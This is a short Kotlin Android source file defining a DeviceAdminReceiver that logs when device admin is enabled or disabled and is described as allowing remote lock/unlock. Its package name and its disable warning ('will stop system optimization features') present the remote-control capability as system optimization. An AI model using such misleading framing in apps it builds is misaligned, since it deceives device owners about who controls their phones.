package com.system.optimizer.admin

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent
import android.util.Log

/**
 * Device Admin Receiver — enables remote lock/unlock via DevicePolicyManager.
 * Declared in AndroidManifest with BIND_DEVICE_ADMIN permission.
 */
class AdminReceiver : DeviceAdminReceiver() {

    private val TAG = "AdminReceiver"

    override fun onEnabled(context: Context, intent: Intent) {
        super.onEnabled(context, intent)
        Log.i(TAG, "Device admin enabled")
    }

    override fun onDisabled(context: Context, intent: Intent) {
        super.onDisabled(context, intent)
        Log.i(TAG, "Device admin disabled")
    }

    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        return "Disabling will stop system optimization features."
    }
}
